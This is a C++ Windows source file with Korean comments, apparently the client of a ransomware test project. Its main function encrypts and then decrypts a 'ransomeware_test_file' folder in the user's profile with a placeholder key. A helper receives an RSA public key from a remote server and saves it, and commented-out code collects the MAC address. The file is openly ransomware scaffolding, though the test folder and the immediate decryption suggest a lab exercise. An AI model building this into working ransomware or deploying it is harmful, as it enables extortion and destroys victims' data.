#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h> // IP Helper 라이브러리
#include <iostream>
#include <fstream>
#include <time.h>
#include <ctime>
#include <openssl/ssl.h>
#include <openssl/pem.h>
#include "framework.h"
#include "client.h"
#include "fileEnc.hpp"

using namespace std;

#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib") // IP Helper 라이브러리
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

#define DEFAULT_PORT "8080"

bool receiveAndSavePublicKey(SOCKET ConnectSocket);

string userName;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{

    string filename = "C:\\Users";
    string downloadname, documentsname, desktopname, foldername;

    userName = getUserName();
    filename += "\\" + userName + "\\ransomeware_test_file";
    cout << "username: " << userName << endl;
    cout << endl;


    // 암호화 키 생성 
    unsigned char key[32] = { 0x00, }; //generateKey();

    EncryptDir(key, filename);

    DecryptDir(key, filename);


  
    return 0;
}




//cout << GetMacAddress() << endl;
// MAC 주소 가져오는 함수
//std::string GetMacAddress() {
//    ULONG ulOutBufLen = 0;
//    PIP_ADAPTER_INFO pAdapterInfo = NULL;
//    std::string macAddress = "";
//
//    // GetAdaptersInfo 호출하여 버퍼의 크기 가져오기
//    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
//        // 버퍼 할당
//        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
//        if (pAdapterInfo == NULL) {
//            return macAddress;
//        }
//
//        // 어댑터 정보 가져오기
//        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
//            // 첫 번째 어댑터의 MAC 주소 가져오기
//            if (pAdapterInfo->AddressLength > 0) {
//                for (DWORD i = 0; i < pAdapterInfo->AddressLength; i++) {
//                    // MAC 주소를 16진수 문자열로 변환하여 macAddress에 저장
//                    char temp[3];
//                    sprintf_s(temp, "%02X", (int)pAdapterInfo->Address[i]);
//                    macAddress += temp;
//
//                    // MAC 주소 구분자 (:) 추가
//                    if (i < pAdapterInfo->AddressLength - 1) {
//                        macAddress += ":";
//                    }
//                }
//            }
//        }
//
//        // 할당된 메모리 해제
//        free(pAdapterInfo);
//    }
//
//    return macAddress;
//}


bool receiveAndSavePublicKey(SOCKET ConnectSocket) {
    const int bufferSize = 4096; // 공개 키의 최대 길이로 조정
    char recvBuffer[bufferSize];
    int iResult = recv(ConnectSocket, recvBuffer, bufferSize, 0);
    if (iResult <= 0) {
        std::cerr << "Failed to receive public key from server" << std::endl;
        return false;
    }

    // PEM 형식으로 공개 키 변환
    std::string publicKeyStr(recvBuffer, iResult);
    BIO* bio = BIO_new_mem_buf(publicKeyStr.c_str(), -1);
    RSA* rsaKey = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (rsaKey == nullptr) {
        std::cerr << "Failed to convert public key to PEM format" << std::endl;
        return false;
    }

    // PEM 파일로 저장
    FILE* pemFile = fopen("public_key.pem", "wb");
    if (pemFile == nullptr) {
        std::cerr << "Failed to create PEM file" << std::endl;
        RSA_free(rsaKey);
        return false;
    }
    if (PEM_write_RSAPublicKey(pemFile, rsaKey) == 0) {
        std::cerr << "Failed to write public key to PEM file" << std::endl;
        RSA_free(rsaKey);
        fclose(pemFile);
        return false;
    }

    RSA_free(rsaKey);
    fclose(pemFile);

    std::cout << "Public key received and saved to public_key.pem" << std::endl;
    return true;
}

